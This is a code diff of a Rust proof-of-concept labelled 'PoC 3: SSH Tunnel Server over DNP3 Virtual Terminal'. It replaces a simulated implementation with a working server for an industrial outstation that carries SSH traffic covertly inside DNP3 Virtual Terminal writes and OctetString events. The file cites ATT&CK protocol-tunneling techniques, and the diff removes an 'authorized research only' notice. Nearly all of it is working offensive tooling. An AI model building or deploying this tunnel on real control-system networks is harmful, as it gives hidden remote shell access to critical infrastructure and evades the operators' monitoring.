@@ -1,47 +1,71 @@
 //! PoC 3: SSH Tunnel Server over DNP3 Virtual Terminal
 //!
-//! This binary implements the server side of the SSH tunnel that runs on
-//! the outstation/IED device.
+//! Runs on the outstation/IED side. Listens for DNP3 connections on port 20000,
+//! receives data via G112 (VT Output) writes from the master, and forwards it to
+//! a local SSH daemon. Responses from the SSH daemon are returned as G111 (OctetString)
+//! events that the master polls.
 //!
 //! ## Usage
 //!
 //! ```bash
-//! cargo run -p example-virtual-terminal --bin vt_tunnel_server -- --help
-//!
-//! # Start server with defaults (forwards to local SSH)
-//! cargo run -p example-virtual-terminal --bin vt_tunnel_server -- \
-//!     --target 127.0.0.1:22
+//! cargo run -p example-virtual-terminal --bin vt_tunnel_server -- --target 127.0.0.1:22
 //! ```
 //!
 //! ## MITRE ATT&CK References
 //! - T1572: Protocol Tunneling
 //! - T1071: Application Layer Protocol
 //! - T0869: Standard Application Layer Protocol (ICS)
-//! - T0886: Remote Services
 
-mod common;
-mod poc3_ssh_tunnel;
-
-use std::sync::Arc;
 use std::time::Duration;
 
-use poc3_ssh_tunnel::{SimulatedVtHandler, TunnelServer, TunnelServerConfig};
-use tokio::sync::Mutex;
+use dnp3::app::measurement::OctetString;
+use dnp3::app::control::CommandStatus;
+use dnp3::app::*;
+use dnp3::link::*;
+use dnp3::outstation::database::*;
+use dnp3::outstation::*;
+use dnp3::tcp::*;
 
-/// Command-line arguments for the tunnel server
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::TcpStream;
+use tokio::sync::mpsc;
+
+/// Maximum bytes per OctetString event chunk (G111 max variation = 255, we stay well under)
+const CHUNK_SIZE: usize = 240;
+/// VT port index used for the tunnel
+const VT_PORT: u16 = 0;
+
+// ─── Application callbacks ───────────────────────────────────────────────────
+
+/// OutstationApplication that forwards incoming G112 writes to an mpsc channel.
+struct VtOutstationApp {
+    /// Sends raw bytes received via G112 writes toward the SSH bridge task.
+    to_ssh_tx: mpsc::UnboundedSender<Vec<u8>>,
+}
+
+impl OutstationApplication for VtOutstationApp {
+    fn handle_virtual_terminal_write(
+        &mut self,
+        port: u16,
+        data: &[u8],
+    ) -> Result<(), RequestError> {
+        if port == VT_PORT {
+            let _ = self.to_ssh_tx.send(data.to_vec());
+        }
+        Ok(())
+    }
+}
+
+struct NullInfo;
+impl OutstationInformation for NullInfo {}
+
+// ─── Command-line args ───────────────────────────────────────────────────────
+
 struct Args {
-    /// Address to listen for DNP3 connections
     dnp3_listen: String,
-    /// Target endpoint to forward connections to
     target: String,
-    /// DNP3 outstation address
     outstation_addr: u16,
-    /// DNP3 master address
     master_addr: u16,
-    /// Virtual terminal port index
-    vt_port: u16,
-    /// Run integration test instead of server
-    test_mode: bool,
 }
 
 impl Default for Args {
@@ -51,8 +75,6 @@ impl Default for Args {
             target: "127.0.0.1:22".into(),
             outstation_addr: 10,
             master_addr: 1,
-            vt_port: 0,
-            test_mode: false,
         }
     }
 }
@@ -60,86 +82,49 @@ impl Default for Args {
 fn parse_args() -> Args {
     let mut args = Args::default();
     let mut argv = std::env::args().skip(1);
-
     while let Some(arg) = argv.next() {
         match arg.as_str() {
             "-d" | "--dnp3-listen" => {
-                if let Some(val) = argv.next() {
-                    args.dnp3_listen = val;
+                if let Some(v) = argv.next() {
+                    args.dnp3_listen = v;
                 }
             }
             "-t" | "--target" => {
-                if let Some(val) = argv.next() {
-                    args.target = val;
+                if let Some(v) = argv.next() {
+                    args.target = v;
                 }
             }
             "--outstation-addr" => {
-                if let Some(val) = argv.next() {
-                    args.outstation_addr = val.parse().unwrap_or(10);
+                if let Some(v) = argv.next() {
+                    args.outstation_addr = v.parse().unwrap_or(10);
                 }
             }
             "--master-addr" => {
-                if let Some(val) = argv.next() {
-                    args.master_addr = val.parse().unwrap_or(1);
+                if let Some(v) = argv.next() {
+                    args.master_addr = v.parse().unwrap_or(1);
                 }
-            }
-            "--vt-port" => {
-                if let Some(val) = argv.next() {
-                    args.vt_port = val.parse().unwrap_or(0);
-                }
-            }
-            "--test" => {
-                args.test_mode = true;
             }
             "-h" | "--help" => {
-                print_help();
+                println!("DNP3-SSH Tunnel Server");
+                println!("  -d, --dnp3-listen <ADDR>  DNP3 listen address [default: 0.0.0.0:20000]");
+                println!("  -t, --target <ADDR>        Target endpoint [default: 127.0.0.1:22]");
+                println!("  --outstation-addr <N>      DNP3 outstation address [default: 10]");
+                println!("  --master-addr <N>          DNP3 master address [default: 1]");
                 std::process::exit(0);
             }
             _ => {
                 eprintln!("Unknown argument: {}", arg);
-                print_help();
                 std::process::exit(1);
             }
         }
     }
-
     args
 }
 
-fn print_help() {
-    println!(
-        r#"
-DNP3-SSH Tunnel Server (PoC 3)
-
-USAGE:
-    vt_tunnel_server [OPTIONS]
-
-OPTIONS:
-    -d, --dnp3-listen <ADDR>      Address to listen for DNP3 connections [default: 0.0.0.0:20000]
-    -t, --target <ADDR>           Target endpoint to forward to [default: 127.0.0.1:22]
-    --outstation-addr <ADDR>      DNP3 outstation address [default: 10]
-    --master-addr <ADDR>          DNP3 master address [default: 1]
-    --vt-port <PORT>              Virtual terminal port index [default: 0]
-    --test                        Run integration test mode
-    -h, --help                    Print help information
-
-EXAMPLE:
-    # Start the tunnel server forwarding to SSH
-    vt_tunnel_server --target 127.0.0.1:22
-
-    # Forward to a different service
-    vt_tunnel_server --target 192.168.1.50:80
-
-SECURITY NOTICE:
-    This tool is for authorized security research and testing only.
-    Use only with proper authorization in controlled environments.
-"#
-    );
-}
+// ─── Main ────────────────────────────────────────────────────────────────────
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // Initialize logging
     tracing_subscriber::fmt()
         .with_max_level(tracing::Level::INFO)
         .with_target(false)
@@ -149,203 +134,149 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     println!();
     println!("================================================================");
-    println!("  PoC 3: DNP3-SSH Tunnel Server");
-    println!("  Protocol Tunneling over DNP3 Virtual Terminal Objects");
+    println!("  PoC 3: DNP3-SSH Tunnel Server (Real DNP3)");
     println!("================================================================");
-    println!();
-    println!("  DNP3 Listen: {}", args.dnp3_listen);
-    println!("  Target:      {}", args.target);
-    println!("  Outstation:  {}", args.outstation_addr);
-    println!("  Master:      {}", args.master_addr);
-    println!("  VT Port:     {}", args.vt_port);
-    println!();
-    println!("----------------------------------------------------------------");
+    println!("  DNP3 Listen:  {}", args.dnp3_listen);
+    println!("  Target SSH:   {}", args.target);
+    println!("  Outstation:   {}", args.outstation_addr);
+    println!("  Master:       {}", args.master_addr);
     println!();
 
-    if args.test_mode {
-        return run_integration_test().await;
-    }
+    // Channel: G112 writes → SSH bridge
+    let (to_ssh_tx, to_ssh_rx) = mpsc::unbounded_channel::<Vec<u8>>();
 
-    let config = TunnelServerConfig {
-        dnp3_listen_addr: args.dnp3_listen,
-        target_endpoint: args.target,
-        outstation_addr: args.outstation_addr,
-        master_addr: args.master_addr,
-        vt_port: args.vt_port,
-        connect_timeout: Duration::from_secs(10),
-        ..Default::default()
-    };
+    // Build the outstation config
+    let outstation_config = OutstationConfig::new(
+        EndpointAddress::try_new(args.outstation_addr)?,
+        EndpointAddress::try_new(args.master_addr)?,
+        EventBufferConfig::new(0, 0, 0, 0, 0, 0, 0, 64), // 64 octet-string events
+    );
 
-    let vt_handler = Arc::new(Mutex::new(SimulatedVtHandler::new()));
-    let server = TunnelServer::new(config);
+    // Create DNP3 TCP server
+    let mut server = Server::new_tcp_server(
+        LinkErrorMode::Close,
+        args.dnp3_listen.parse()?,
+    );
 
-    // Note: In production, the VT handler would be integrated with
-    // the actual DNP3 outstation. This simulated version demonstrates
-    // the architecture and data flow.
-    println!("[TunnelServer] Running in simulated mode");
-    println!("[TunnelServer] Waiting for VT data...");
-    println!();
-    println!("In production, integrate with DNP3 outstation:");
-    println!("  1. Handle g112 writes via handle_virtual_terminal_output()");
-    println!("  2. Queue g113 events via OctetString database updates");
-    println!();
+    let outstation = server.add_outstation(
+        outstation_config,
+        Box::new(VtOutstationApp {
+            to_ssh_tx,
+        }),
+        Box::new(NullInfo),
+        DefaultControlHandler::with_status(CommandStatus::NotSupported),
+        NullListener::create(),
+        AddressFilter::Any,
+    )?;
 
-    server.run_simulated(vt_handler).await
+    // Add OctetString point at index VT_PORT for carrying SSH→master data
+    outstation.transaction(|db| {
+        db.add(VT_PORT, Some(EventClass::Class1), OctetStringConfig);
+    });
+
+    // Bind the server - keep the handle alive or the server shuts down
+    let _server_handle = server.bind().await?;
+    println!("[Server] DNP3 outstation listening on port 20000");
+    println!("[Server] Waiting for master to connect...");
+
+    // Run the SSH bridge in a separate task
+    let db_handle = outstation.clone();
+    let target = args.target.clone();
+    tokio::spawn(async move {
+        run_ssh_bridge(to_ssh_rx, db_handle, target).await;
+    });
+
+    // Keep the server alive until Ctrl-C
+    let _ = tokio::signal::ctrl_c().await;
+    println!("[Server] Shutting down");
+    Ok(())
 }
 
-/// Run integration test demonstrating tunnel data flow
-async fn run_integration_test() -> Result<(), Box<dyn std::error::Error>> {
-    use poc3_ssh_tunnel::{fragment_data, FragmentReassembler, SimulatedVtChannel, TunnelFrame};
+// ─── SSH Bridge ──────────────────────────────────────────────────────────────
 
-    println!("Running Integration Test");
-    println!("------------------------");
-    println!();
+/// Bridges G112 writes (from master) to an SSH daemon, and sends SSH responses
+/// back as G111 (OctetString) events that the master polls.
+async fn run_ssh_bridge(
+    mut from_master_rx: mpsc::UnboundedReceiver<Vec<u8>>,
+    db: OutstationHandle,
+    target_addr: String,
+) {
+    let mut ssh_stream: Option<TcpStream> = None;
+    let mut read_buf = vec![0u8; 4096];
 
-    // Create simulated channels
-    let client_channel = Arc::new(Mutex::new(SimulatedVtChannel::new()));
-    let server_handler = Arc::new(Mutex::new(SimulatedVtHandler::new()));
+    loop {
+        // Wait for either incoming G112 data or readable SSH data
+        tokio::select! {
+            // G112 write from master → forward to SSH server
+            msg = from_master_rx.recv() => {
+                let Some(data) = msg else { break };
 
-    // Test 1: Reset handshake
-    println!("Test 1: Reset Handshake");
-    {
-        let mut client = client_channel.lock().await;
-        let reset = TunnelFrame::new_reset();
-        client.write_vt(&reset.to_bytes());
-        println!("  Client -> Server: RESET frame");
-    }
+                if ssh_stream.is_none() {
+                    // First data chunk: open connection to SSH server
+                    println!("[Bridge] Connecting to SSH server at {}", target_addr);
+                    match TcpStream::connect(&target_addr).await {
+                        Ok(stream) => {
+                            println!("[Bridge] Connected to SSH server");
+                            ssh_stream = Some(stream);
+                        }
+                        Err(e) => {
+                            eprintln!("[Bridge] Failed to connect to SSH server: {}", e);
+                            continue;
+                        }
+                    }
+                }
 
-    {
-        let mut client = client_channel.lock().await;
-        let mut server = server_handler.lock().await;
-        for data in client.drain_outbound() {
-            server.receive_g112(data);
-        }
-    }
+                if let Some(ref mut stream) = ssh_stream {
+                    println!("[Bridge] Master → SSH: {} bytes", data.len());
+                    if let Err(e) = stream.write_all(&data).await {
+                        eprintln!("[Bridge] SSH write error: {}", e);
+                        ssh_stream = None;
+                    }
+                }
+            }
 
-    {
-        let mut server = server_handler.lock().await;
-        let data = server.poll_inbound().unwrap();
-        let frame = TunnelFrame::from_bytes(&data).unwrap();
-        assert!(frame.is_reset());
-        println!("  Server received RESET: OK");
-
-        let reset_ack = TunnelFrame::new_reset();
-        server.queue_g113(&reset_ack.to_bytes());
-        println!("  Server -> Client: RESET ACK");
-    }
-    println!("  [PASS]");
-    println!();
-
-    // Test 2: Data transfer (simulated SSH banner)
-    println!("Test 2: Data Transfer (SSH Banner Simulation)");
-    let ssh_banner = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n";
-    {
-        let mut client = client_channel.lock().await;
-        let frames = fragment_data(ssh_banner, 0);
-        for frame in &frames {
-            client.write_vt(&frame.to_bytes());
-        }
-        println!("  Client -> Server: {} bytes ({} frame(s))", ssh_banner.len(), frames.len());
-    }
-
-    {
-        let mut client = client_channel.lock().await;
-        let mut server = server_handler.lock().await;
-        for data in client.drain_outbound() {
-            server.receive_g112(data);
-        }
-    }
-
-    {
-        let mut server = server_handler.lock().await;
-        let mut reassembler = FragmentReassembler::new();
-
-        while let Some(data) = server.poll_inbound() {
-            let frame = TunnelFrame::from_bytes(&data).unwrap();
-            if let Some(msg) = reassembler.add_frame(frame).unwrap() {
-                assert_eq!(&msg, ssh_banner);
-                println!("  Server received: \"{}\"", String::from_utf8_lossy(&msg).trim());
+            // Data from SSH server → send as G111 events to master
+            result = async {
+                match &mut ssh_stream {
+                    Some(s) => s.read(&mut read_buf).await,
+                    None => std::future::pending().await,
+                }
+            } => {
+                match result {
+                    Ok(0) => {
+                        println!("[Bridge] SSH server closed connection");
+                        ssh_stream = None;
+                    }
+                    Ok(n) => {
+                        let data = read_buf[..n].to_vec();
+                        println!("[Bridge] SSH → Master: {} bytes", data.len());
+                        send_as_events(&db, &data);
+                    }
+                    Err(e) => {
+                        eprintln!("[Bridge] SSH read error: {}", e);
+                        ssh_stream = None;
+                    }
+                }
             }
         }
     }
-    println!("  [PASS]");
-    println!();
+}
 
-    // Test 3: Large data fragmentation
-    println!("Test 3: Large Data Fragmentation (1KB)");
-    let large_data: Vec<u8> = (0..1024).map(|i| i as u8).collect();
-    {
-        let mut client = client_channel.lock().await;
-        let frames = fragment_data(&large_data, 0);
-        println!("  Fragmenting {} bytes into {} frames", large_data.len(), frames.len());
-        for frame in &frames {
-            client.write_vt(&frame.to_bytes());
+/// Chunk `data` into CHUNK_SIZE pieces and store each as an OctetString event
+/// at point index VT_PORT with EventMode::Force so a new event is always generated.
+fn send_as_events(db: &OutstationHandle, data: &[u8]) {
+    for chunk in data.chunks(CHUNK_SIZE) {
+        let chunk = chunk.to_vec();
+        // EventMode::Force: always generate event even if value unchanged
+        // update_static: false: don't change the static value (not needed for streaming)
+        if let Ok(os) = OctetString::new(&chunk) {
+            db.transaction(|db| {
+                db.update(
+                    VT_PORT,
+                    &os,
+                    UpdateOptions::new(false, EventMode::Force),
+                );
+            });
         }
     }
-
-    {
-        let mut client = client_channel.lock().await;
-        let mut server = server_handler.lock().await;
-        for data in client.drain_outbound() {
-            server.receive_g112(data);
-        }
-    }
-
-    {
-        let mut server = server_handler.lock().await;
-        let mut reassembler = FragmentReassembler::new();
-        let mut received_len = 0;
-
-        while let Some(data) = server.poll_inbound() {
-            let frame = TunnelFrame::from_bytes(&data).unwrap();
-            if let Some(msg) = reassembler.add_frame(frame).unwrap() {
-                assert_eq!(msg.len(), large_data.len());
-                assert_eq!(msg, large_data);
-                received_len = msg.len();
-            }
-        }
-        println!("  Server received {} bytes intact", received_len);
-    }
-    println!("  [PASS]");
-    println!();
-
-    // Test 4: Close handshake
-    println!("Test 4: Close Handshake");
-    {
-        let mut client = client_channel.lock().await;
-        let close = TunnelFrame::new_close(5);
-        client.write_vt(&close.to_bytes());
-        println!("  Client -> Server: CLOSE frame (seq=5)");
-    }
-
-    {
-        let mut client = client_channel.lock().await;
-        let mut server = server_handler.lock().await;
-        for data in client.drain_outbound() {
-            server.receive_g112(data);
-        }
-    }
-
-    {
-        let mut server = server_handler.lock().await;
-        let data = server.poll_inbound().unwrap();
-        let frame = TunnelFrame::from_bytes(&data).unwrap();
-        assert!(frame.is_close());
-        assert_eq!(frame.sequence, 5);
-        println!("  Server received CLOSE (seq={}): OK", frame.sequence);
-    }
-    println!("  [PASS]");
-    println!();
-
-    println!("================================================================");
-    println!("  All Integration Tests PASSED");
-    println!("================================================================");
-    println!();
-    println!("Ready for PoC validation:");
-    println!("  1. Start server: cargo run -p example-virtual-terminal --bin vt_tunnel_server");
-    println!("  2. Start client: cargo run -p example-virtual-terminal --bin vt_tunnel_client");
-    println!("  3. Connect: ssh -p 2222 localhost");
-    println!();
-
-    Ok(())
 }
